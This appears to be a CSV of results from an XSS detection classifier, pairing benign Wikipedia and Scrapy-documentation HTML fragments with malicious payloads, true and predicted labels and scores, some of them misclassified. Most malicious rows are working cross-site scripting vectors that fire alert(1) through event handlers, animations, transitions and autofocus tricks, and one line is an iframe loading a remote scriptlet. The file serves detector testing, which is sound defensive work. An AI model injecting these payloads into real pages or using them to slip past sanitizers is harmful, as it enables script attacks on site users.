payload,true_label,predicted_label,reason
"<div class=""shortdescription nomobile noexcerpt noprint searchaux"" style=""display:none"">Intelligence demonstrated by machines </div>",0,0,"Scores: {'benign': 2.9977, 'malicious': 0.0000}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<caption onmousemove=""alert(1)"">test</caption>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></textarea>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></pre>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9996}"
AI in early science fiction.,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
<dialog onpointerup=alert(1)>XSS</dialog>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<li id=""cite_note-221""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-221"">^ </a> </b> ",0,0,"Scores: {'benign': 2.9998, 'malicious': 0.0000}"
<svg id=x tabindex=1 onactivate=alert(1)></svg>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"	 </span> <span class=""reference-text"">",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"	 <div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/File:Overfitted_Data.png"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/6/68/Overfitted_Data.png/220px-Overfitted_Data.png"" decoding=""async"" width=""220"" height=""149"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/6/68/Overfitted_Data.png/330px-Overfitted_Data.png 1.5x, //upload.wikimedia.org/wikipedia/commons/6/68/Overfitted_Data.png 2x"" data-file-width=""377"" data-file-height=""256"" /> </a>  <div class=""thumbcaption"">",0,1,"Scores: {'benign': 0.9999, 'malicious': 1.9999}"
"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"	 </span> <span class=""toctext"">Further reading ",0,0,"Scores: {'benign': 2.9972, 'malicious': 0.0000}"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meta>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<li><a href=""/wiki/Conventionalism"" title=""Conventionalism"">Conventionalism </a> </li>",0,0,"Scores: {'benign': 2.9993, 'malicious': 0.0000}"
"<code onkeydown=""alert(1)"" contenteditable>test</code>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1117%2F12.474462"">10.1117/12.474462 </a>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.isd.mel.nist.gov/documents/albus/4DRCS.pdf"">the original </a> <span class=""cs1-format"">(PDF) ",0,0,"Scores: {'benign': 2.9942, 'malicious': 0.0000}"
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
	 </span> </li>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Guardian&amp;rft.atitle=Elon+Musk%3A+artificial+intelligence+is+our+biggest+existential+threat&amp;rft.date=2014-10-27&amp;rft.aulast=Gibbs&amp;rft.aufirst=Samuel&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2014%2Foct%2F27%2Felon-musk-artificial-intelligence-ai-biggest-existential-threat&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,"Scores: {'benign': 2.9948, 'malicious': 0.0000}"
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
	 </span> </h3>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<li id=""cite_note-379""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-379"">^ </a> </b> ",0,0,"Scores: {'benign': 2.9987, 'malicious': 0.0000}"
<blink onpointerover=alert(1)>XSS</blink>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
<li id=x tabindex=1 onfocusin=alert(1)></li>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
 </p>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<mark onmousemove=""alert(1)"">test</mark>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<del onpaste=""alert(1)"" contenteditable>test</del>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
<tfoot onpointerover=alert(1)>XSS</tfoot>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<table onpaste=""alert(1)"" contenteditable>test</table>",1,0,"Scores: {'benign': 2.9964, 'malicious': 0.0000}"
<ruby onpointerdown=alert(1)>XSS</ruby>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
<content onpointerup=alert(1)>XSS</content>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<ul><li><a href=""/wiki/Database"" title=""Database"">Database management system </a> </li>",0,0,"Scores: {'benign': 2.9996, 'malicious': 0.0000}"
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Robotics"" title=""Robotics"">Robotics </a> </div>",0,0,"Scores: {'benign': 2.9996, 'malicious': 0.0000}"
<del onpointerout=alert(1)>XSS</del>,1,0,"Scores: {'benign': 1.9994, 'malicious': 0.9998}"
"<li><a href=""/wiki/Machine_vision"" title=""Machine vision"">Machine vision </a> </li>",0,0,"Scores: {'benign': 2.9986, 'malicious': 0.0000}"
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
<head onpointerover=alert(1)>XSS</head>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;653??64, </li>",0,0,"Scores: {'benign': 2.9979, 'malicious': 0.0000}"
          <footer>,0,0,"Scores: {'benign': 2.9992, 'malicious': 0.0000}"
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></caption>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
	 </span> 2007 ,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<p>The ch as reasoning and logic. The functional model refers to the correlating data to its computed counterpart.<sup id=""cite_ref-87"" class=""reference""><a href=""#cite_note-87"">&#91;84&#93; </a> </sup> consist of particular traits or capabilities that researchers expect an intelligent system to display. The traits described below have received the most attention.<sup id=""cite_ref-Problems_of_AI_15-2"" class=""reference""><a href=""#cite_note-Problems_of_AI-15"">&#91;15&#93; </a> </sup>",0,0,"Scores: {'benign': 1.9995, 'malicious': 0.9995}"
	 </span>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/overview.html"">Scrapy at a glance</a></li>",0,0,"Scores: {'benign': 2.9992, 'malicious': 0.0000}"
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;600??04 </li> </ul>",0,0,"Scores: {'benign': 2.9973, 'malicious': 0.0000}"
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<li><cite id=""CITEREFMcCorduck2004"" class=""citation""><a href=""/wiki/Pamela_McCorduck"" title=""Pamela McCorduck"">McCorduck, Pamela </a> (2004), <a rel=""nofollow"" class=""external text"" href=""http://www.pamelamc.com/html/machines_who_think.html""><i>Machines Who Think </i> </a> (2nd ed.), Natick, MA: A. K. Peters, Ltd., <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/1-56881-205-1"" title=""Special:BookSources/1-56881-205-1""><bdi>1-56881-205-1 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Machines+Who+Think&amp;rft.place=Natick%2C+MA&amp;rft.edition=2nd&amp;rft.pub=A.+K.+Peters%2C+Ltd.&amp;rft.date=2004&amp;rft.isbn=1-56881-205-1&amp;rft.aulast=McCorduck&amp;rft.aufirst=Pamela&amp;rft_id=http%3A%2F%2Fwww.pamelamc.com%2Fhtml%2Fmachines_who_think.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"Scores: {'benign': 0.9995, 'malicious': 1.9992}"
"<label onmouseup=""alert(1)"">test</label>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
	 </span></p>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<li id=""cite_note-Multi-agent_planning-114""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Multi-agent_planning_114-0"">^ </a> </b> ",0,0,"Scores: {'benign': 2.9984, 'malicious': 0.0000}"
	 </span> ,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
<svg><animate onend=alert(1) attributeName=x dur=1s>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
 ,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
 </li>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<li><a href=""/wiki/Progress_in_artificial_intelligence"" title=""Progress in artificial intelligence"">Progress in artificial intelligence </a> </li>",0,0,"Scores: {'benign': 2.9992, 'malicious': 0.0000}"
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"<li id=""cite_note-49""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-49"">^ </a> </b> ",0,0,"Scores: {'benign': 2.9983, 'malicious': 0.0000}"
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;113??32 </li>",0,0,"Scores: {'benign': 2.9999, 'malicious': 0.0000}"
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;193??96 </li>",0,0,"Scores: {'benign': 1.9990, 'malicious': 0.9995}"
"<li id=""cite_note-FOOTNOTEO&#39;BrienMarakas2011-286""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEO&#39;BrienMarakas2011_286-0"">^ </a> </b> ",0,0,"Scores: {'benign': 2.9966, 'malicious': 0.0000}"
<svg><bdo onload=alert(1)></bdo>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<blockquote onmouseup=""alert(1)"">test</blockquote>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<param onmouseleave=""alert(1)"">test</param>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<h1 onclick=""alert(1)"">test</h1>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
"<li><a href=""/wiki/Adam_Tooze"" title=""Adam Tooze"">Tooze, Adam </a>, ""Democracy and Its Discontents"", <i><a href=""/wiki/The_New_York_Review_of_Books"" title=""The New York Review of Books"">The New York Review of Books </a> </i>, vol. LXVI, no. 10 (6 June 2019), pp.&#160;52??3, 56??7.  ""Democracy has no clear answer for the mindless operation of <a href=""/wiki/Bureaucracy"" title=""Bureaucracy"">bureaucratic </a> and <a href=""/wiki/Technology"" title=""Technology"">technological power </a>.  We may indeed be witnessing its extension in the form of artificial intelligence and <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>.  Likewise, after decades of dire warning, the <a href=""/wiki/Environmentalism"" title=""Environmentalism"">environmental problem </a> remains fundamentally unaddressed.... Bureaucratic overreach and environmental catastrophe are precisely the kinds of slow-moving existential challenges that democracies deal with very badly.... Finally, there is the threat du jour:  <a href=""/wiki/Corporation"" title=""Corporation"">corporations </a> and the technologies they promote.""  (pp.&#160;56??7.) </li> </ul>",0,0,"Scores: {'benign': 2.9893, 'malicious': 0.0000}"
"          <dd><a href=""/en/2.0/"">2.0</a></dd>",0,0,"Scores: {'benign': 2.9988, 'malicious': 0.0000}"
"<li><img alt=""List-Class article"" src=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/16px-Symbol_list_class.svg.png"" decoding=""async"" title=""List-Class article"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/23px-Symbol_list_class.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/d/db/Symbol_list_class.svg/31px-Symbol_list_class.svg.png 2x"" data-file-width=""180"" data-file-height=""185"" /> <b><a href=""/wiki/List_of_emerging_technologies"" title=""List of emerging technologies"">List of emerging technologies </a> </b> </li> </ul>",0,0,"Scores: {'benign': 2.9988, 'malicious': 0.0000}"
"<template onmouseup=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Kermany, D; Goldbaum, M; Zhang, Kang (2018). <a rel=""nofollow"" class=""external text"" href=""https://www.cell.com/action/captchaChallenge?redirectUri=%2Fcell%2Fpdf%2FS0092-8674%2818%2930154-5.pdf"">""Identifying Medical Diagnoses and Treatable Diseases by Image-Based Deep Learning"" </a> <span class=""cs1-format"">(PDF) ",0,0,"Scores: {'benign': 2.9987, 'malicious': 0.0000}"
<svg><textarea onload=alert(1)></textarea>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
<th id=x tabindex=1 onactivate=alert(1)></th>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
<isindex id=x tabindex=1 onactivate=alert(1)></isindex>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
	 </span></a></dt><dd>Understand the Scrapy architecture.</dd>,0,0,"Scores: {'benign': 2.9994, 'malicious': 0.0000}"
<ins onpointermove=alert(1)>XSS</ins>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
 </li>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<details onclick=""alert(1)"">test</details>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
	 </span>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<div id=""p-variants"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-variants-label"">",0,0,"Scores: {'benign': 2.9981, 'malicious': 0.0000}"
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<noframes onmouseenter=""alert(1)"">test</noframes>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9996}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
<select onpointerout=alert(1)>XSS</select>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"<embed onmouseover=""alert(1)"">test</embed>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"<span oncopy=""alert(1)"" contenteditable>test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
 </p>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F09540090310001655110"">10.1080/09540090310001655110 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Connection+Science&amp;rft.atitle=Developmental+robotics%3A+a+survey&amp;rft.volume=15&amp;rft.issue=4&amp;rft.pages=151-190&amp;rft.date=2003&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.83.7615&amp;rft_id=info%3Adoi%2F10.1080%2F09540090310001655110&amp;rft.aulast=Lungarella&amp;rft.aufirst=M.&amp;rft.au=Metta%2C+G.&amp;rft.au=Pfeifer%2C+R.&amp;rft.au=Sandini%2C+G.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,0,"Scores: {'benign': 2.9987, 'malicious': 0.0000}"
"<li><a href=""/wiki/Jason_Jixuan_Hu"" title=""Jason Jixuan Hu"">Jason Jixuan Hu </a> </li>",0,0,"Scores: {'benign': 2.9998, 'malicious': 0.0000}"
          </dd>,0,0,"Scores: {'benign': 2.9997, 'malicious': 0.0000}"
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
<iframe src=http://.rocks/scriptlet.html <,1,0,"Scores: {'benign': 1.9993, 'malicious': 0.9997}"
"<ul><li><a href=""/wiki/Type_physicalism"" title=""Type physicalism"">identity theory </a> </li> </ul> </li>",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<ul><li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;509??30, </li>",0,0,"Scores: {'benign': 2.9987, 'malicious': 0.0000}"
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"Moving and <a href=""/wiki/Configuration_space_(physics)"" title=""Configuration space (physics)"">configuration space </a>:",0,0,"Scores: {'benign': 2.9992, 'malicious': 0.0000}"
"  Built with <a href=""http://sphinx-doc.org/"">Sphinx</a> using a <a href=""https://github.com/rtfd/sphinx_rtd_theme"">theme</a> provided by <a href=""https://readthedocs.org"">Read the Docs</a>. ",0,0,"Scores: {'benign': 2.9997, 'malicious': 0.0000}"
 </p>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
<multicol onpointerenter=alert(1)>XSS</multicol>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
<sub id=x tabindex=1 onfocus=alert(1)></sub>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"          <dd><a href=""/en/0.24/"">0.24</a></dd>",0,0,"Scores: {'benign': 2.9995, 'malicious': 0.0000}"
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></th>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<bdi onmousedown=""alert(1)"">test</bdi>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<ul><li><a href=""/wiki/Technological_unemployment"" title=""Technological unemployment"">Technological unemployment </a> </li>",0,0,"Scores: {'benign': 2.9996, 'malicious': 0.0000}"
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"<link draggable=""true"" ondrag=""alert(1)"">test</link>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<li><a href=""/wiki/Computer_vision"" title=""Computer vision"">Computer vision </a> </li>",0,0,"Scores: {'benign': 2.9996, 'malicious': 0.0000}"
	 <div> </div> </td> </tr> </tbody> </table>,0,0,"Scores: {'benign': 1.9986, 'malicious': 0.9994}"
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<li><a href=""/wiki/Emergentism"" title=""Emergentism"">Emergentism </a> </li>",0,0,"Scores: {'benign': 2.9998, 'malicious': 0.0000}"
<body onpointerover=alert(1)>XSS</body>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
<code onpointerdown=alert(1)>XSS</code>,1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9999}"
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Other </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,"Scores: {'benign': 2.9986, 'malicious': 0.0000}"
"<li><a href=""/wiki/Fitness_function"" title=""Fitness function"">Fitness function </a> </li>",0,0,"Scores: {'benign': 2.9998, 'malicious': 0.0000}"
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;424??33, </li>",0,0,"Scores: {'benign': 2.9991, 'malicious': 0.0000}"
	 </span>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
	 </span>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9998}"
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
"        <a href=""intro/overview.html"" class=""btn btn-neutral float-right"" title=""Scrapy at a glance"" accesskey=""n"" rel=""next"">Next <span class=""fa fa-arrow-circle-right"">",0,0,"Scores: {'benign': 2.9991, 'malicious': 0.0000}"
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>,1,1,"Scores: {'benign': 0.0000, 'malicious': 2.9997}"
"<template draggable=""true"" ondragenter=""alert(1)"">test</template>",1,1,"Scores: {'benign': 0.0000, 'malicious': 3.0000}"
	 </span> </h3>,0,0,"Scores: {'benign': 3.0000, 'malicious': 0.0000}"
